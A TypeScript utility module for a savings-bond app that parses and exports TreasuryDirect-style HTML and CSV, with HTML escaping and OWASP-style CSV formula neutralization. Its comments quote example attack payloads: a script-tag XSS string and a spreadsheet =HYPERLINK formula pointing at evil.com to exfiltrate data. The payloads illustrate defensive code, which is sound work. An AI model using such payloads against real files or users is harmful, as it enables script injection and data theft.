import { Bond } from '../types';

/**
 * Escape user-controlled strings for safe interpolation into HTML text
 * content OR attribute values. Covers the five characters that can
 * break out of either context (`&`, `<`, `>`, `"`, `'`).
 *
 * Always wrap ANY bond field (especially `note`, which the user types
 * directly) in this before templating it into HTML — see
 * `generateTreasuryHTML`. Without it, a note of
 * `<script>alert(1)</script>` will execute when the exported inventory
 * file is opened in any browser.
 */
function escapeHTML(s: string | number): string {
  return String(s)
    .replace(/&/g, '&amp;') // & first — otherwise we'd double-escape later steps
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;');
}

/**
 * Inverse of `escapeHTML` for the hidden-input fallback parser.
 * TreasuryDirect's saveable HTML stores display strings already
 * entity-encoded, so we decode them back to their raw text. Combined
 * with `escapeHTML` on export, this gives us a clean round-trip without
 * silently turning legitimate `<` / `>` / `&` characters in serials
 * and notes into `&lt;` / `&gt;` / `&amp;`.
 *
 * Note: the `&amp;` replacement runs LAST so we don't double-decode.
 */
function unescapeHTML(s: string): string {
  return s
    .replace(/&#39;/g, "'")
    .replace(/&quot;/g, '"')
    .replace(/&gt;/g, '>')
    .replace(/&lt;/g, '<')
    .replace(/&amp;/g, '&'); // & last
}

/**
 * Prefix CSV cell values that start with a formula trigger (one of
 * `=`, `+`, `-`, `@`, TAB, CR) with a single quote so spreadsheet apps
 * (Excel, LibreOffice, Numbers) interpret the cell as literal text
 * rather than executing the payload.
 *
 * Standard OWASP defense against CSV-injection / formula-injection.
 * Protects users who export their portfolio then open the CSV in a
 * spreadsheet that auto-executes formulas — without this, a note of
 * `=HYPERLINK("https://evil.com/?exfil", "Open me")` becomes a
 * clickable exfiltration link the moment the file is opened.
 */
function neutralizeCSVFormula(s: string): string {
  if (/^[=+\-@\t\r]/.test(s)) return "'" + s;
  return s;
}

/**
 * Reference date used by every "as of today" computation in the app
 * (the dashboard's maturity comparisons in App.tsx, and `isBondMatured`'s
 * default reference when called without explicit args).
 *
 * Centralized in one place so a future bump can flip the whole dashboard
 * at once, and so tests can pin a deterministic reference without
 * freezing "now" globally (`new Date()` would be TZ-sensitive and shift
 * across month rollover). `{ year, month }` is also the shape
 * `isBondMatured(b.finalMaturity, year, month)` expects.
 */
export const CURRENT_REFERENCE_DATE = { year: 2026, month: 7 };

/**
 * Decodes the Treasury month value (e.g., 745) to "MM/YYYY" format.
 * Base: May 2003 = 745
 */
export function decodeTreasuryMonth(monthValue: number): string {
  if (isNaN(monthValue)) return "";
  const totalMonthIndex = monthValue + 23295;
  const year = Math.floor(totalMonthIndex / 12);
  const month = (totalMonthIndex % 12) + 1;
  const monthStr = month < 10 ? `0${month}` : `${month}`;
  return `${monthStr}/${year}`;
}

/**
 * Encodes a "MM/YYYY" date string to Treasury month value.
 */
export function encodeTreasuryMonth(dateStr: string): number {
  if (!dateStr) return 0;
  const parts = dateStr.split('/');
  if (parts.length !== 2) return 0;
  const month = parseInt(parts[0], 10);
  const year = parseInt(parts[1], 10);
  if (isNaN(month) || isNaN(year)) return 0;
  
  const totalMonthIndex = year * 12 + (month - 1);
  return totalMonthIndex - 23295;
}

/**
 * Parses an HTML file content string and returns list of Bonds.
 * Supports both Table Row parsing and Hidden Input parsing.
 */
export function parseBondsFromHTML(htmlText: string): Bond[] {
  const bonds: Bond[] = [];
  
  try {
    // 1. Try parsing via DOMParser (for tables)
    const parser = new DOMParser();
    const doc = parser.parseFromString(htmlText, 'text/html');
    const rows = doc.querySelectorAll('table tr');
    
    if (rows && rows.length > 0) {
      rows.forEach(row => {
        const cells = row.querySelectorAll('td');
        // A valid bond row has exactly 11 columns
        if (cells.length === 11 && !row.id.includes('ttl') && !row.querySelector('th')) {
          const serial = cells[0].textContent?.trim() || "";
          const series = cells[1].textContent?.trim() as 'I' | 'EE';
          const denomText = cells[2].textContent?.trim() || "";
          const issueDate = cells[3].textContent?.trim() || "";
          const nextAccrual = cells[4].textContent?.trim() || "";
          const finalMaturity = cells[5].textContent?.trim() || "";
          const issuePriceText = cells[6].textContent?.trim() || "";
          const interestText = cells[7].textContent?.trim() || "";
          const rateText = cells[8].textContent?.trim() || "";
          const valueText = cells[9].textContent?.trim() || "";
          const note = cells[10].textContent?.trim() || "";
          
          if (serial && (series === 'I' || series === 'EE')) {
            const denomination = parseFloat(denomText.replace(/[^0-9.]/g, '')) || 0;
            const issuePrice = parseFloat(issuePriceText.replace(/[^0-9.]/g, '')) || 0;
            const interest = parseFloat(interestText.replace(/[^0-9.]/g, '')) || 0;
            const interestRate = parseFloat(rateText.replace(/[^0-9.]/g, '')) || 0;
            const value = parseFloat(valueText.replace(/[^0-9.]/g, '')) || 0;
            
            bonds.push({
              serial,
              series,
              denomination,
              issueDate,
              nextAccrual,
              finalMaturity,
              issuePrice,
              interest,
              interestRate,
              value,
              note: note === '\xa0' || note === '&nbsp;' ? "" : note
            });
          }
        }
      });
    }
    
    if (bonds.length > 0) {
      return bonds;
    }
  } catch (err) {
    console.warn("DOM parsing failed, falling back to hidden inputs parser", err);
  }
  
  // 2. Fallback: Parse from Hidden Variables using regex (very robust)
  try {
    const serialListRaw = extractHiddenValue(htmlText, 'SerialNumList');
    const seriesListRaw = extractHiddenValue(htmlText, 'SeriesList');
    const denominationListRaw = extractHiddenValue(htmlText, 'DenominationList');
    const issuePriceListRaw = extractHiddenValue(htmlText, 'IssuePriceList');
    const interestListRaw = extractHiddenValue(htmlText, 'InterestList');
    const valueListRaw = extractHiddenValue(htmlText, 'ValueList');
    const interestRateListRaw = extractHiddenValue(htmlText, 'InterestRateList');
    const issueDateListRaw = extractHiddenValue(htmlText, 'IssueDateList');
    const nextAccrualDateListRaw = extractHiddenValue(htmlText, 'NextAccrualDateList');
    const maturityDateListRaw = extractHiddenValue(htmlText, 'MaturityDateList');
    const noteListRaw = extractHiddenValue(htmlText, 'NoteList');
    
    if (serialListRaw) {
      const serials = serialListRaw.split(';').map(s => s.trim()).filter(Boolean);
      const series = seriesListRaw.split(';').map(s => s.trim()).filter(Boolean);
      const denoms = denominationListRaw.split(';').map(s => s.trim()).filter(Boolean);
      const issuePrices = issuePriceListRaw.split(';').map(s => s.trim()).filter(Boolean);
      const interests = interestListRaw.split(';').map(s => s.trim()).filter(Boolean);
      const values = valueListRaw.split(';').map(s => s.trim()).filter(Boolean);
      const rates = interestRateListRaw.split(';').map(s => s.trim()).filter(Boolean);
      const issueDates = issueDateListRaw.split(';').map(s => s.trim()).filter(Boolean);
      const nextAccruals = nextAccrualDateListRaw.split(';').map(s => s.trim()).filter(Boolean);
      const maturities = maturityDateListRaw.split(';').map(s => s.trim()).filter(Boolean);
      const notes = noteListRaw.split(';').map(s => s.trim()); // preserve spacing or empty notes
      
      const count = serials.length;
      for (let i = 0; i < count; i++) {
        const serial = serials[i];
        const ser = (series[i] || 'I') as 'I' | 'EE';
        const denom = parseFloat(denoms[i]) || 0;
        const price = parseFloat(issuePrices[i]) || 0;
        const intr = parseFloat(interests[i]) || 0;
        const val = parseFloat(values[i]) || 0;
        const rate = parseFloat(rates[i]) || 0;
        
        // Dates need to be decoded
        const issueDate = decodeTreasuryMonth(parseInt(issueDates[i], 10));
        const nextAccrual = decodeTreasuryMonth(parseInt(nextAccruals[i], 10));
        const finalMaturity = decodeTreasuryMonth(parseInt(maturities[i], 10));
        const rawNote = notes[i] === " " ? "" : (notes[i] || "");

        // Round-trip with escapeHTML on export: hidden-input payload is
        // entity-encoded, so decode on import to recover the original
        // raw text the user typed (otherwise a serial like `C827&EE`
        // comes back as `C827&amp;EE` in the UI).
        bonds.push({
          serial: unescapeHTML(serial),
          series: unescapeHTML(ser) as 'I' | 'EE',
          denomination: denom,
          issueDate: unescapeHTML(issueDate),
          nextAccrual: unescapeHTML(nextAccrual),
          finalMaturity: unescapeHTML(finalMaturity),
          issuePrice: price,
          interest: intr,
          interestRate: rate,
          value: val,
          note: unescapeHTML(rawNote),
        });
      }
    }
  } catch (err) {
    console.error("Hidden inputs parsing failed too", err);
  }
  
  return bonds;
}

function extractHiddenValue(html: string, name: string): string {
  const regex = new RegExp(`name="${name}"\\s+value="([^"]*)"`, 'i');
  const match = html.match(regex);
  return match ? match[1] : "";
}

/**
 * Generates an HTML output matching the US Treasury's saveable format.
 */
export function generateTreasuryHTML(bonds: Bond[]): string {
  // To match Treasury Direct perfectly, we can convert dates to their encoded numbers
  // Note: the original HTML displays the table row in standard order (or reverse, we can preserve standard).
  //
  // SECURITY: every user-controlled string (serial, series, note, dates)
  // is passed through `escapeHTML` before being joined into semicolon-
  // delimited lists or table cell bodies. Without this, a note of
  // `<script>...</script>` or `"; onclick=...` would either execute
  // when the file is opened in a browser or break out of the hidden
  // input's value="..." attribute.
  const serials = bonds.map(b => escapeHTML(b.serial)).join(';') + ';';
  const issueDates = bonds.map(b => encodeTreasuryMonth(b.issueDate)).join(';') + ';';
  const series = bonds.map(b => escapeHTML(b.series)).join(';') + ';';
  const denoms = bonds.map(b => b.denomination).join(';') + ';';
  const issuePrices = bonds.map(b => b.issuePrice.toFixed(2)).join(';') + ';';
  const interests = bonds.map(b => b.interest.toFixed(2)).join(';') + ';';
  const ytdInterests = bonds.map(() => '0.00').join(';') + ';'; // Placeholder YTD
  const values = bonds.map(b => b.value.toFixed(2)).join(';') + ';';
  const rates = bonds.map(b => b.interestRate.toFixed(2)).join(';') + ';';
  const nextAccruals = bonds.map(b => encodeTreasuryMonth(b.nextAccrual)).join(';') + ';';
  const maturities = bonds.map(b => encodeTreasuryMonth(b.finalMaturity)).join(';') + ';';
  const notes = bonds.map(b => b.note ? escapeHTML(b.note) : ' ').join(';') + ';';

  const totalPrice = bonds.reduce((sum, b) => sum + b.issuePrice, 0);
  const totalValue = bonds.reduce((sum, b) => sum + b.value, 0);
  const totalInterest = bonds.reduce((sum, b) => sum + b.interest, 0);

  let rowsHtml = '';
  bonds.forEach(b => {
    rowsHtml += `<tr>
<td>${escapeHTML(b.serial)}</td>
<td class="c1">${escapeHTML(b.series)}</td>
<td>$${escapeHTML(b.denomination)}</td>
<td>${escapeHTML(b.issueDate)}</td>
<td>${escapeHTML(b.nextAccrual)}</td>
<td>${escapeHTML(b.finalMaturity)}</td>
<td>$${escapeHTML(b.issuePrice.toFixed(2))}</td>
<td>$${escapeHTML(b.interest.toFixed(2))}</td>
<td>${escapeHTML(b.interestRate.toFixed(2))}%</td>
<td class="ttl">$${escapeHTML(b.value.toFixed(2))}</td>
<td class="c1">${b.note ? escapeHTML(b.note) : '&nbsp;'}</td>
</tr>\n`;
  });

  return `<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
	<title>Calculated Value of Your Paper Savings Bond(s)</title>
	<style>
		body { font-family: sans-serif; margin: 20px; }
		table { border-collapse: collapse; width: 100%; margin-top: 20px; }
		th, td { border: 1px solid #ddd; padding: 8px; text-align: left; }
		th { background-color: #f2f2f2; }
		.ttl { font-weight: bold; }
		.c1 { text-align: center; }
	</style>
</head>
<body>
	<h1>Calculated Value of Your Paper Savings Bond(s)</h1>
	<form method="post" action="https://treasurydirect.gov/BC/SBCPrice">
		<!-- Hidden Variables -->
		<input type="hidden" name="SerialNumList" value="${serials}">
		<input type="hidden" name="IssueDateList" value="${issueDates}">
		<input type="hidden" name="SeriesList" value="${series}">
		<input type="hidden" name="DenominationList" value="${denoms}">
		<input type="hidden" name="IssuePriceList" value="${issuePrices}">
		<input type="hidden" name="InterestList" value="${interests}">
		<input type="hidden" name="YTDInterestList" value="${ytdInterests}">
		<input type="hidden" name="ValueList" value="${values}">
		<input type="hidden" name="InterestRateList" value="${rates}">
		<input type="hidden" name="NextAccrualDateList" value="${nextAccruals}">
		<input type="hidden" name="MaturityDateList" value="${maturities}">
		<input type="hidden" name="NoteList" value="${notes}">
		<input type="hidden" name="OldRedemptionDate" value="1023">
		<input type="hidden" name="ViewPos" value="${bonds.length}">
		<input type="hidden" name="ViewType" value="All">
		<input type="hidden" name="Version" value="6">
		
		<h2>Calculator Results for Redemption Date</h2>
		<table id="tot">
			<tbody>
				<tr>
					<th>Total Price</th>
					<th>Total Value</th>
					<th>Total Interest</th>
				</tr>
				<tr>
					<td>$${totalPrice.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}</td>
					<td>$${totalValue.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}</td>
					<td>$${totalInterest.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}</td>
				</tr>
			</tbody>
		</table>

		<br>
		<h2>Bonds: 1-${bonds.length} of ${bonds.length}</h2>
		<table>
			<thead>
				<tr>
					<th>Serial #</th>
					<th>Series</th>
					<th>Denom</th>
					<th>Issue Date</th>
					<th>Next Accrual</th>
					<th>Final Maturity</th>
					<th>Issue Price</th>
					<th>Interest</th>
					<th>Interest Rate</th>
					<th>Value</th>
					<th>Note</th>
				</tr>
			</thead>
			<tbody>
				${rowsHtml}
				<tr id="ttls">
					<td colspan="6">Totals for ${bonds.length} Bonds</td>
					<td>$${totalPrice.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}</td>
					<td>$${totalInterest.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}</td>
					<td></td>
					<td>$${totalValue.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}</td>
					<td></td>
				</tr>
			</tbody>
		</table>
	</form>
</body>
</html>`;
}

/**
 * Parses CSV text into a Bond list.
 */
export function parseBondsFromCSV(csvText: string): Bond[] {
  const bonds: Bond[] = [];
  const lines = csvText.split(/\r?\n/);
  
  for (let i = 0; i < lines.length; i++) {
    const line = lines[i].trim();
    if (!line) continue;
    
    // Parse commas while respecting quotes if any
    const cols: string[] = [];
    let insideQuote = false;
    let currentCell = '';
    
    for (let j = 0; j < line.length; j++) {
      const char = line[j];
      if (char === '"') {
        insideQuote = !insideQuote;
      } else if (char === ',' && !insideQuote) {
        cols.push(currentCell.trim());
        currentCell = '';
      } else {
        currentCell += char;
      }
    }
    cols.push(currentCell.trim());
    
    // Skip header line if it contains 'serial' or 'series'
    if (i === 0 && (cols[0].toLowerCase().includes('serial') || cols[1].toLowerCase().includes('series'))) {
      continue;
    }
    
    // Expected structure:
    // Serial, Series, Denomination, Issue Date, Next Accrual, Final Maturity, Issue Price, Interest, Interest Rate, Value, Note
    if (cols.length >= 2) {
      const serial = cols[0].replace(/"/g, '');
      const seriesRaw = cols[1].replace(/"/g, '').toUpperCase();
      const series = (seriesRaw === 'EE' || seriesRaw === 'I') ? seriesRaw : 'I';
      
      const denomination = parseFloat((cols[2] || '0').replace(/[^0-9.]/g, '')) || 0;
      const issueDate = (cols[3] || '').replace(/"/g, '');
      const nextAccrual = (cols[4] || '').replace(/"/g, '');
      const finalMaturity = (cols[5] || '').replace(/"/g, '');
      const issuePrice = parseFloat((cols[6] || '0').replace(/[^0-9.]/g, '')) || 0;
      const interest = parseFloat((cols[7] || '0').replace(/[^0-9.]/g, '')) || 0;
      const interestRate = parseFloat((cols[8] || '0').replace(/[^0-9.]/g, '')) || 0;
      const value = parseFloat((cols[9] || '0').replace(/[^0-9.]/g, '')) || 0;
      const note = (cols[10] || '').replace(/"/g, '');
      
      if (serial) {
        bonds.push({
          serial,
          series,
          denomination,
          issueDate,
          nextAccrual,
          finalMaturity,
          issuePrice,
          interest,
          interestRate,
          value,
          note
        });
      }
    }
  }
  
  return bonds;
}

/**
 * Generates CSV string for the bond list.
 */
export function generateCSV(bonds: Bond[]): string {
  const headers = [
    'Serial #', 'Series', 'Denomination', 'Issue Date', 'Next Accrual',
    'Final Maturity', 'Issue Price', 'Interest', 'Interest Rate', 'Value', 'Note'
  ];
  
  // SECURITY: every text cell passes through `neutralizeCSVFormula`
  // so spreadsheet apps don't auto-execute a payload that starts with
  // a formula trigger (=, +, -, @, TAB, CR). Numeric cells are safe
  // by construction — they can't start with a formula character.
  const rows = bonds.map(b => [
    `"${neutralizeCSVFormula(b.serial)}"`,
    `"${neutralizeCSVFormula(b.series)}"`,
    b.denomination,
    `"${neutralizeCSVFormula(b.issueDate)}"`,
    `"${neutralizeCSVFormula(b.nextAccrual)}"`,
    `"${neutralizeCSVFormula(b.finalMaturity)}"`,
    b.issuePrice,
    b.interest,
    b.interestRate,
    b.value,
    `"${neutralizeCSVFormula(b.note.replace(/"/g, '""'))}"`,
  ]);
  
  return [headers.join(','), ...rows.map(r => r.join(','))].join('\n');
}

/**
 * Checks if a bond is matured (using Final Maturity MM/YYYY vs current/selected date).
 * Simple check: if Final Maturity is prior to or equal to current date.
 * We can parse MM/YYYY and compare to check.
 */
export function isBondMatured(
  maturityStr: string,
  // Default to the centralized reference date; App.tsx callers
  // currently pass `CURRENT_REFERENCE_DATE` explicitly to keep the
  // dashboard deterministic across sessions and timezones, but any
  // future caller that omits these will still get a sensible value.
  currentYear: number = CURRENT_REFERENCE_DATE.year,
  currentMonth: number = CURRENT_REFERENCE_DATE.month,
): boolean {
  if (!maturityStr) return false;
  const parts = maturityStr.split('/');
  if (parts.length !== 2) return false;
  const month = parseInt(parts[0], 10);
  const year = parseInt(parts[1], 10);
  if (isNaN(month) || isNaN(year)) return false;
  
  if (year < currentYear) return true;
  if (year === currentYear && month <= currentMonth) return true;
  return false;
}
